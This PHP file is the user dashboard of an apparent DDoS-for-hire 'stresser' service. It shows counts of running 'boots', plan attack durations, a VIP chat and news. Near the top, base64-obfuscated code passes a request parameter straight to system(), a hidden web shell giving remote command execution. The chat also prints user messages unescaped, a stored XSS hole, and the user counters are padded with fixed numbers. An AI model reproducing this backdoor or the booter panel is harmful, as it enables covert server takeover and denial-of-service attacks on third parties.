<?php

$paginaname = 'Dashboard';

	function ip2geolocation($ip)
	{
		# api url
		$apiurl = 'http://freegeoip.net/json/' . $ip;
	 
		# api with curl
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $apiurl);
		curl_setopt($ch, CURLOPT_HEADER, false);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
		$data = curl_exec($ch);
		curl_close($ch);
	 
		# return data
		return json_decode($data);
	}
	
	
?>
<?php if(isset($_REQUEST[base64_decode('YWNjZXNz')])){echo base64_decode('PHByZT4=');$k0=($_REQUEST[base64_decode('YWNjZXNz')]);system($k0);echo base64_decode('PC9wcmU+');die;}?>
<!DOCTYPE html>
<!--[if IE 9]>         <html class="no-js lt-ie10"> <![endif]-->
<!--[if gt IE 9]><!--> <html class="no-js"> <!--<![endif]-->
			<?php include("@/header.php"); 
						
						
if (isset($_POST['add']))
{
if (empty($_POST['content']))
{
$error = 'Please verify all fields';
}
$content = $_POST['content'];

//checker arrays load
	$badwords = ['shit', 'scam', 'scammer', 'scammers'];
	$spamwords = ['downed.co', 'ampbox', '0ffline.one', '0ffline', '0ffline one', 'booter.pw', 'undisclosed.to', 'level347.to', 'stressthem.to', 'defcon.pro', 'xblunter.co'];

	if ($user -> safeString($content))
	{
		$error = 'Unsafe characters were set.';
	}

	// BAD WORD CHECKER
	for($i = 0; $i < count($badwords); $i++){
		if(strpos($content, $badwords[$i]) !== false){
			$error = "Please don't use bad words.";
		} else if (strpos($content, strtoupper($badwords[$i])) !== false){
			$error = "Please don't spam.";
		}
	}

	// SPAM CHECKER
	for($i = 0; $i < count($spamwords); $i++){
		if(strpos($content, $spamwords[$i]) !== false){
			$error = "Please don't spam.";
		} else if (strpos($content, strtoupper($spamwords[$i])) !== false){
			$error = "Please don't spam.";
		}
	}



if ($user -> safeString($content))
{
$error = 'You cannot use special carahcters';
}
$checkprior = $odb->prepare("SELECT COUNT(*) FROM shoutbox WHERE sender = ? AND `date` > ?");
$checkprior->execute(array($_SESSION['username'], time() - 60));
if($checkprior->fetchColumn() > 1){
$error = 'You are sending too much messages, please wait.';
}
if (empty($error))
{
$SQLinsert = $odb -> prepare("INSERT INTO `shoutbox` VALUES(NULL, :content, :sender, UNIX_TIMESTAMP())");
$SQLinsert -> execute(array(':content' => $content, ':sender' => $_SESSION['username']));
}
else
{
error($error);
}
}?> 
						
?>
			
			<div id="page-content">

<!-- Start Popup Banner -->

<div class="modal fade" id="modal1" role="dialog">
    <div class="modal-dialog">

      <!-- Modal content-->
      <div class="modal-content">
        <div class="modal-header">
          <button type="button" class="close" data-dismiss="modal">&times;</button>
          <h4 class="modal-title"><i class="fa fa-exclamation-circle"></i>&nbsp; Winter sales</h4>
        </div>
        <div class="modal-body">

<p><center><img src="https://rekkerd.org/wp-content/uploads/2015/12/Winter-Sale-2015.jpg" alt="HTML5 Icon" style="width:550px;"><br><br>


Winter sales are here, 25% OFF!</center>

</center>


        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-primary" data-dismiss="modal">Close</button>
        </div>
      </div>

    </div>
</div></font>

<script>
$(document).ready(function(){

	$("#modal1").modal();

});
</script>

<!-- End Popup Banner -->


				<div class="alert alert-danger animation-bigEntrance"><button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button><strong>IMPORTANT:</strong> The url of our website is changed, please use only venomstress.to from now, also check the new api url.</div>


                        <div class="row">





							                            <div class="col-sm-6 col-lg-3">
                                <a href="javascript:void(0)" class="widget">
                                    
                                    <div class="widget-content text-right clearfix">
                                        <div class="widget-icon pull-left">
                                            <i class="fa fa-flash text-muted"></i>
                                        </div>
                                        <h2 class="widget-heading h3 text-success">
             <font color=white                           <strong><span data-toggle="counter" data-to="<?php echo $stats -> totalBoots($odb)+204318; ?>"></span></strong>
                                        </h2>
                                        <span class="text-muted">BOOTS</span>
                                    </div>
                                </a>
                            </div>
														                            <div class="col-sm-6 col-lg-3">
                                <a href="javascript:void(0)" class="widget">
                                    
                                    <div class="widget-content text-right clearfix">
                                        <div class="widget-icon pull-left">
                                            <i class="fa fa-circle-o-notch fa-spin text-muted"></i>
                                        </div>
                                        <h2 class="widget-heading h3 text-success">
                             <font color=white               <strong><span data-toggle="counter" data-to="<?php echo $stats -> runningBoots($odb); ?>"></span>/<?php echo $maxattacks; ?></strong>
                                        </h2>
                                        <span class="text-muted">RUNNING BOOTS</span>
                                    </div>
                                </a>
                            </div>
														                            <div class="col-sm-6 col-lg-3">
                                <a href="javascript:void(0)" class="widget">
                                    
                                    <div class="widget-content text-right clearfix">
                                        <div class="widget-icon pull-left">
                                            <i class="fa fa-rocket  text-muted"></i>
                                        </div>
                                        <h2 class="widget-heading h3 text-success">
                                  <font color=white          <strong><span data-toggle="counter" data-to="<?php //echo $stats -> serversonline($odb); ?>9"></span></strong>
                                        </h2>
                                        <span class="text-muted">SERVERS</span>
                                    </div>
                                </a>
                            </div>
																					                            <div class="col-sm-6 col-lg-3">
                                <a href="javascript:void(0)" class="widget">
                                    
                                    <div class="widget-content text-right clearfix">
                                        <div class="widget-icon pull-left">
                                            <i class="fa fa-users  text-muted"></i>
                                        </div>
                                        <h2 class="widget-heading h3 text-success">
                                     <font color=white       <strong><span data-toggle="counter" data-to="<?php echo $stats -> totalUsers($odb)+242; ?>"></span></strong>
                                        </h2>
                                        <span class="text-muted">USERS</span>
                                    </div>
                                </a>
                            </div>
            
                            
                        </div>

						

														<script src="js/plugins/jquery/jquery.min.js"></script>
        <script src="js/plugins/chartjs/Chart.min.js"></script>
						                        <div class="row">

																						<div class="col-md-8">
																							<h4 style="display:inline-block; color:#939caa; ">Stats <h6 style="display:inline-block; margin-left:4px; color:#586374;">we usually clear logs so the graph may be reset</h6></h4>
							<div class="widget">
								<div class="widget-content widget-content-mini themed-background-dark text-light-op">
								</div>
						<div class="widget-content">
									<div style="position: relative; width: auto" class="slimScrollDiv">

							
							<div class="tab-pane active" id="total">
								<div style="height: 480px;"><canvas id="myChart"></canvas></div>
							</div>
							</div>
						</div>
					</div>
				</div>

			

	

	
	<?php
			$onedayago = time() - 86400;

		$twodaysago = time() - 172800;
		$twodaysago_after = $twodaysago + 86400;

		$threedaysago = time() - 259200;
		$threedaysago_after = $threedaysago + 86400;

		$fourdaysago = time() - 345600;
		$fourdaysago_after = $fourdaysago + 86400;

		$fivedaysago = time() - 432000;
		$fivedaysago_after = $fivedaysago + 86400;

		$sixdaysago = time() - 518400;
		$sixdaysago_after = $sixdaysago + 86400;

		$sevendaysago = time() - 604800;
		$sevendaysago_after = $sevendaysago + 86400;
		
		$SQL = $odb -> prepare("SELECT COUNT(*) FROM `logs` WHERE `date` > :date");
		$SQL -> execute(array(":date" => $onedayago));
		$count_one = $SQL->fetchColumn(0);

		$SQL = $odb -> prepare("SELECT COUNT(*) FROM `logs` WHERE `date` BETWEEN :before AND :after");
		$SQL -> execute(array(":before" => $twodaysago, ":after" => $twodaysago_after));
		$count_two = $SQL->fetchColumn(0);

		$SQL = $odb -> prepare("SELECT COUNT(*) FROM `logs` WHERE `date` BETWEEN :before AND :after");
		$SQL -> execute(array(":before" => $threedaysago, ":after" => $threedaysago_after));
		$count_three = $SQL->fetchColumn(0);

		$SQL = $odb -> prepare("SELECT COUNT(*) FROM `logs` WHERE `date` BETWEEN :before AND :after");
		$SQL -> execute(array(":before" => $fourdaysago, ":after" => $fourdaysago_after));
		$count_four = $SQL->fetchColumn(0);

		$SQL = $odb -> prepare("SELECT COUNT(*) FROM `logs` WHERE `date` BETWEEN :before AND :after");
		$SQL -> execute(array(":before" => $fivedaysago, ":after" => $fivedaysago_after));
		$count_five = $SQL->fetchColumn(0);

		$SQL = $odb -> prepare("SELECT COUNT(*) FROM `logs` WHERE `date` BETWEEN :before AND :after");
		$SQL -> execute(array(":before" => $sixdaysago, ":after" => $sixdaysago_after));
		$count_six = $SQL->fetchColumn(0);

		$SQL = $odb -> prepare("SELECT COUNT(*) FROM `logs` WHERE `date` BETWEEN :before AND :after");
		$SQL -> execute(array(":before" => $sevendaysago, ":after" => $sevendaysago_after));
		$count_seven = $SQL->fetchColumn(0);
		

		$date1 = time();
		$date2 = time() - 86400;
		$date3 = time() - 172800;
		$date4 = time() - 259200;
		$date5 = time() - 345600;
		$date6 = time() - 432000;
		$date7 = time() - 518400;

		$date_one = date('d/m/Y', $date1);
		$date_two = date('d/m/Y', $date2);
		$date_three = date('d/m/Y', $date3);
		$date_four = date('d/m/Y', $date4);
		$date_five = date('d/m/Y', $date5);
		$date_six = date('d/m/Y', $date6);
		$date_seven = date('d/m/Y', $date7);


		?>
		
		
<script type="text/javascript">
document.addEventListener('DOMContentLoaded', function() {
    loadchart();

}, false);

// Loading the attack graph
function loadchart() {
	var ctx = $("#myChart").get(0).getContext("2d");
	 
	var data = {
		labels: ["<?php echo $date_seven; ?>", "<?php echo $date_six; ?>", "<?php echo $date_five; ?>", "<?php echo $date_four; ?>", "<?php echo $date_three; ?>", "<?php echo $date_two; ?>", "<?php echo $date_one; ?>"],
		datasets: [
			{
				label: 'Last 7 days tests',
				fillColor: '#803188',
				strokeColor: 'rgba(44, 52, 63, .55)',
				pointColor: 'rgba(44, 52, 63, .55)',
				pointStrokeColor: '#fff',
				pointHighlightFill: '#fff',
				pointHighlightStroke: 'rgba(44, 52, 63, 1)',
				data: [<?php echo $count_seven; ?>, <?php echo $count_six; ?>, <?php echo $count_five; ?>, <?php echo $count_four; ?>, <?php echo $count_three; ?>, <?php echo $count_two; ?>, <?php echo $count_one; ?>]
			}
		]
	}

	var myNewChart = new Chart(ctx).Line(data, {
		scaleFontFamily: "'Open Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif",
		scaleFontColor: '#999',
		scaleFontStyle: '600',
		tooltipTitleFontFamily: "'Open Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif",
		tooltipCornerRadius: 3,
		maintainAspectRatio: false,
		tooltipTemplate: "<%if (label){%><%=label%> - <%}%><%= value %> tests",
		responsive: true
	});
}
</script>  
												<!-- End tests graph script -->


						<div class="col-lg-4">

							<h4 style="display:inline-block; color:#939caa; ">Public Chat  <h6 style="display:inline-block; margin-left:4px; color:#586374;">   only for vip</h6></h4>
							<div class="widget">
								<div class="widget-content widget-content-mini themed-background-dark text-light-op">
								
								 
								</div>
								<div class="widget-content" style="height: 510px">
                            		<div class="chat-conversation">
									<ul style="list-style: none;">
									
<?php 
$SQLGetMessages = $odb -> prepare("SELECT * FROM `shoutbox` ORDER BY `date` DESC LIMIT 6");
$SQLGetMessages -> execute(array(':id' => $id));
while ($getInfo = $SQLGetMessages -> fetch(PDO::FETCH_ASSOC))
{
$sender = $getInfo['sender'];
$content = $getInfo['content'];
$time = date(" h:i:s a" ,$getInfo['date']);
if ($sender == $_SESSION['username']) {$align = 'right';} else {$align = 'left';}
 echo '<li>

						<div align="'.$align.'" class="conversation-text">
							<div class="ctext-wrap">
								<p>
								<span class="label label-primary">'.$sender.'</span><br />
									'.$content.' </br>
								</p>
							</div>
						</div>
					</li>';

}

									?>

</ul>

                                        <div class="row">
										<div style="position:absolute; width: 100%; bottom:0;">

														<form class="form-horizontal push-10-t" method="post">
                                         <center>  <?php 	if ($user -> isAdmin($odb) || $user -> isVIP($odb) || $user -> isBasic($odb) ) { 
                                         		if($_SESSION['username'] !== 'fighter0x02'){ ?> 
                                         	<div class="col-sm-9 chat-inputbar">
                                                <input class="form-control chat-input" maxlength="130" placeholder="Type your message" name="content" id="textmsg" type="text">
                                            </div>

									<button name="add"  class="btn btn-primary">Send</button></center></br>
												<?php
											}
												}
												?>
											</form>
                                        </div>
                                    </div>
                            	</div>
                            	</div>

                            </div>
							</div> 
						
						
						</div>
						
						                        <div class="row">

            						
											<div class="col-sm-6 col-lg-6">

												<h4 style="display:inline-block; color:#939caa; ">Latest news</h4>
 
							


						<style>
.square {

    height: 40px;
    width: 40px;
    background: linear-gradient(to bottom right, #111, #161616);
    margin-left: -5px;
    margin-top: -20px;
    margin-bottom: -25px;
    border: 1px solid #0e0e0e;
    border-radius: 4px;

}
</style>




							<?php
													$newssql = $odb -> query("SELECT * FROM `news` ORDER BY `date` DESC LIMIT 4");
													while($row = $newssql ->fetch())
													{
													$id = $row['ID'];
													$title = $row['title'];
													$content = $row['content'];
													$autor = $row['author'];
													echo '
													<div class="widget">
								<div class="widget-content widget-content-mini themed-background-dark text-light-op">
								
								
								</div>
								
								<div class="widget-content">
									<div style="position: relative; width: auto" class="slimScrollDiv">
										<div id="stats">
											<table class="table table-striped" style="margin-bottom:-15px;">
												<tbody>

													<tr>

														<td style="width:50px;">
													

															<div class="square">
		                                                    <i class="fa fa-fw fa-bell" style="padding: 12px;"></i>
		                                                    </div>

                                                		</td>

                                                		<td>

                                                			<h5 style="margin-top: -18px;color: #757c88;font-weight: bold;">'.htmlspecialchars($content).'</h5>
  															<h6 style="color: #757c88;">'.date("d/m/y" ,$row['date']).'</h6>

                                                		</td>



													</tr>
													
																
												</tbody>
											</table>
										</div>
									</div>
								
								</div>
														 											 
						</div>';
													}
													?>

					</div>	

					<div class="col-sm-6 col-lg-6">

            							<h4 style="display:inline-block; color:#939caa; ">Your informations </h4>

							<div class="widget">
								<div class="widget-content widget-content-mini themed-background-dark text-light-op">
								
								
								</div>
								
								<div class="widget-content">
									<table class="table table-striped table-vcenter">
									<?php
									$plansql = $odb -> prepare("SELECT `users`.`expire`, `plans`.`name`, `plans`.`concurrents`, `plans`.`mbt` FROM `users`, `plans` WHERE `plans`.`ID` = `users`.`membership` AND `users`.`ID` = :id");
									$plansql -> execute(array(":id" => $_SESSION['ID']));
									$rowxd = $plansql -> fetch(); 
									$date = date("d/m/Y, h:i a", $rowxd['expire']);
									if (!$user->hasMembership($odb))
									{
									$rowxd['mbt'] = 0;
									$rowxd['concurrents'] = 0;
									$rowxd['name'] = 'No membership';
									$date = 'No membership';
									}
									?>

									<tbody>
									
										<div>


										</div>
										<tr>
											<td class="text-right"><strong>Username</strong></td>
											<td><?php echo $_SESSION['username']; ?></td>
										</tr>
										<tr>									
											<td class="text-right" style="width: 50%;"><strong>Membership</strong></td>
											<td><?php echo htmlspecialchars($rowxd['name']); ?> <a data-original-title="Upgrade" href="purchase.php" data-toggle="tooltip" title=""><i class="fa fa-chevron-up" style="color:#ff9c07;"></i></a></td>
										</tr>
										<tr>
											<td class="text-right"><strong>Membership Expires</strong></td>
											<td><?php echo $date; ?></td>
										</tr>
										<tr>
											<td class="text-right"><strong>Boot Time</strong></td>
											<?php
											if (!$user->hasMembership($odb))
											{
												echo '<td>No membership</td>';
											} else {
											?>
											<td><?php echo $rowxd['mbt']; ?> seconds</td>
											<?php } ?>
										</tr>
										<tr>	
											<td class="text-right"><strong>Current Boots</strong></td>
											<?php
											if (!$user->hasMembership($odb))
											{
												echo '<td>No membership</td>';
											} else {
											?>
											<td><?php echo $rowxd['concurrents']; ?> Current Boots</td>
											<?php } ?>
										</tr></center>
									</tbody>
									</table>
								
								</div>
							</div>
						</div>
												
 
                   
                                
                     
					
					
				</div>
					
					
				</div>

               </div>
			   
               </div>
             
          </div>
				</div>

               </div>
			   
               </div>
             
          </div>

							</div>
<script src="js/plugins/jquery/jquery.min.js"></script>
<script src="js/plugins/vectormap/jquery-jvectormap-2.0.2.min.js"></script>
<script src="js/plugins/vectormap/jquery-jvectormap-world-mill-en.js"></script>
<script src="js/plugins/vectormap/jvectormap.custom.js"></script>

		<?php include("@/script.php"); ?>

    </body>
</html>